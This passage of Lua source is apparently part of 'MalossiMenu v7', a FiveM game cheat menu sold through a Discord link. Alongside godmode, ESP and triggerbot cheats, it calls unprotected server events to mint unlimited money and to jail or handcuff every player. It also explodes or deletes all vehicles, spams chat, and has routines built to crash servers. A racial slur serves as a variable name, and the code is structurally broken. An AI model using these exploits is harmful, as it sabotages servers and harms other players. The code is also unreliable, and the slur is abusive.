								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif blipSprite ~= 1 then 
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true)
							end

							
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true)
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) 
						SetBlipNameToPlayerName(blip, id)
						SetBlipScale(blip,  0.85) 

						
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 128 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)

Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
				
			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
	end
end
local function ToggleGodmode(tog)
	local ped = PlayerPedId()
	SetEntityProofs(ped, tog, tog, tog, tog, tog)
	SetPedCanRagdoll(PlayerPedId(), not tog)
end

if godmode then
			SetEntityInvincible(GetPlayerPed(-1), true)
			SetPlayerInvincible(PlayerId(), true)
			SetPedCanRagdoll(GetPlayerPed(-1), false)
			ClearPedBloodDamage(GetPlayerPed(-1))
			ResetPedVisibleDamage(GetPlayerPed(-1))
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
			SetEntityCanBeDamaged(GetPlayerPed(-1), false)
		else
			SetEntityInvincible(GetPlayerPed(-1), false)
			SetPlayerInvincible(PlayerId(), false)
			SetPedCanRagdoll(GetPlayerPed(-1), true)
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
		end

 if Demigod then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
        end
		
		
					if Torque2 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
		end
		if Torque4 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
		end
		if Torque8 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
		end
		if Torque16 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
		end
		if Torque32 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
		end
		if Torque64 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
		end
		if Torque128 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
		end
		if Torque256 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 256.0 * 20.0)
		end
		if Torque512 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
		end

        

     if Forcefield then
			ForcefieldPlayer(PlayerId(), ForcefieldRadius)
		end
			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end


 
			
			if fuckallcars then
    for aP in EnumerateVehicles() do
        if not
    IsPedAPlayer(GetPedInVehicleSeat(aP, -1)) then SetVehicleHasBeenOwnedByPlayer(aP, false) SetEntityAsMissionEntity(aP, false, false) StartVehicleAlarm(aP) DetachVehicleWindscreen(aP) SmashVehicleWindow(aP, 0) SmashVehicleWindow(aP, 1) SmashVehicleWindow(aP, 2) SmashVehicleWindow(aP, 3) SetVehicleTyreBurst(aP, 0, true, 1000.0) SetVehicleTyreBurst(aP, 1, true, 1000.0) SetVehicleTyreBurst(aP, 2, true, 1000.0) SetVehicleTyreBurst(aP, 3, true, 1000.0) SetVehicleTyreBurst(aP, 4, true, 1000.0) SetVehicleTyreBurst(aP, 5, true, 1000.0) SetVehicleTyreBurst(aP, 4, true, 1000.0) SetVehicleTyreBurst(aP, 7, true, 1000.0) SetVehicleDoorBroken(aP, 0, true) SetVehicleDoorBroken(aP, 1, true) SetVehicleDoorBroken(aP, 2, true) SetVehicleDoorBroken(aP, 3, true) SetVehicleDoorBroken(aP, 4, true) SetVehicleDoorBroken(aP, 5, true) SetVehicleDoorBroken(aP, 6, true) SetVehicleDoorBroken(aP, 7, true) SetVehicleLights(aP, 1) Citizen.InvokeNative(0x1FD09E7390A74D54, aP, 1) SetVehicleNumberPlateTextIndex(aP, 5) SetVehicleNumberPlateText(aP, "M4L0SS1") SetVehicleDirtLevel(aP, 10.0) SetVehicleModColor_1(aP, 1) SetVehicleModColor_2(aP, 1) SetVehicleCustomPrimaryColour(aP, 255, 51, 255) SetVehicleCustomSecondaryColour(aP, 255, 51, 255) SetVehicleBurnout(aP, true) end end end
    if destroyvehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleUndriveable(vehicle, true) SetVehicleEngineHealth(vehicle, 0) end end end
    if alarmvehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleAlarm(vehicle, true) StartVehicleAlarm(vehicle) end end end
    if explodevehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) NetworkExplodeVehicle(vehicle, true, true, false) end end end
    if huntspam then Citizen.Wait(1) TriggerServerEvent('esx-qalle-hunting:reward', 20000) TriggerServerEvent('esx-qalle-hunting:sell') end
    if deletenearestvehicle then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end
			
						if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent('cuffServer', GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(i))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				end
	  
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end
			
		 if crosshair then
                ShowHudComponentThisFrame(14)
            end

          if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

        if CLEAR then
								SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetOverrideWeather("CLEAR")
		end
		
					if BLIZZARD then
								SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		
					if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
		
					if EXTRASUNNY then
								SetWeatherTypePersist("EXTRASUNNY")
        SetWeatherTypeNowPersist("EXTRASUNNY")
        SetWeatherTypeNow("EXTRASUNNY")
        SetOverrideWeather("EXTRASUNNY")
		end
			
			if XMAS then
			            SetForceVehicleTrails(true)
            SetForcePedFootstepsTracks(true)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end

		
			


			if esp then
				for i = 0, 128 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~h~ID: " ..GetPlayerServerId(i) .." ~r~~h~ "..GetPlayerName(i) .."\n~h~~b~ Dist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, false), 1)
				
						DrawText3D(x, y, z + 1.0, message, 255, 255, 255)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					end
				end
			end
			
			local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
			
			
			            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end


                if superGrip then
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end

                if t2x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
                end

                if t4x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
                end

                if t8x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
                end

                if t16x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
                end
            end


			if supergrip then
				SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), CHandlingData, fTractionCurveMin, 1000000)
			end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end
			
			if fall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end
			
function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not HasModelLoaded(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end

        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end

        while not HasModelLoaded(GetHashKey(dg))do
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end

        while not HasModelLoaded(GetHashKey(dj))do
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end

        while not HasModelLoaded(GetHashKey(dk))do
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"SERVER FUCKED BY MALOSSIHOSTING")
        end

        for i=0,128 do
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end


			if blowall then
                 for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
                end
            end
			
			if WorldOnFire then
            local pos = GetEntityCoords(PlayerPedId())
            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                local targetpos = GetEntityCoords(k)
                local x, y, z = table.unpack(targetpos)
                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
            end
            
            for v in EnumeratePeds() do
                if v ~= PlayerPedId() then
                    local targetpos = GetEntityCoords(v)
                    local x, y, z = table.unpack(targetpos)
                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                end
            end
        end

            if freezePlayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end
			
			if banallusers then
				for i = 0, 128 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx-qalle-jail:updateJailTime", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome MalossiMenu v7 buy Mod Menu in https://discord.malossirelease.nl")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome MalossiMenu v6 buy Mod Menu in https://discord.malossirelease.nl")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome MalossiMenu v7 buy Mod Menu in https://discord.malossirelease.nl")
					end
				end

			if esxdestroy then
				for i = 0, 128 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best MalossiMenu v7 https://discord.malossirelease.nl", 10000000)
						
				end
			end
			
			if servercrasher then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
				CreateVehicle(GetHashKey(avion), 0, 0, -10, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(avion2), 0, 3, -1000, true, true)
				CreateVehicle(GetHashKey(avion2), 1621, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion2), 1242, 1, -100, true, true)
				CreateVehicle(GetHashKey(camion), 612, 4, -10, true, true)
				CreateVehicle(GetHashKey(camion), 1234, 0, -50, true, true)
				CreateVehicle(GetHashKey(camion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(random), 512, 1233, -10, true, true)
				CreateVehicle(GetHashKey(random), 155, 2, -50, true, true)
				CreateVehicle(GetHashKey(random), 333, 0, -100, true, true)
				CreateVehicle(GetHashKey(heli), -121, 100, -10, true, true)
				CreateVehicle(GetHashKey(heli), -121, 2555, -50, true, true)
				CreateVehicle(GetHashKey(heli), -121, 123, -100, true, true)
			end
			
		if not Collision then
			playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
			for k in EnumerateVehicles() do
				SetEntityNoCollisionEntity(k, playerveh, true)
			end
			for k in EnumerateObjects() do
				SetEntityNoCollisionEntity(k, playerveh, true)
			end
			for k in EnumeratePeds() do
				SetEntityNoCollisionEntity(k, playerveh, true)
			end
			for k in EnumeratePickups() do
				SetEntityNoCollisionEntity(k, playerveh, true)
				
			end
		end


local ci = true
        if ci then
                local cK = false
                local cL = 130
                local cM = 0
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(i)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if cK then
                            if NetworkIsPlayerTalking(i) then
                                local cN = d(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    cN.r,
                                    cN.g,
                                    cN.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < cL then
                            if not cK then
                                if NetworkIsPlayerTalking(i) then
                                    local cN = d(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        cN.r,
                                        cN.g,
                                        cN.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end
			

			if nuke then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                for i = 0, 128 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)

						local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 118) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 109) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end
			
			 if bifegfubffff then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end
			

			if TriggerBot then
				local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if Aiming then
					if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						ShootPlayer(Entity)
					end
				end
			end
			
			function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
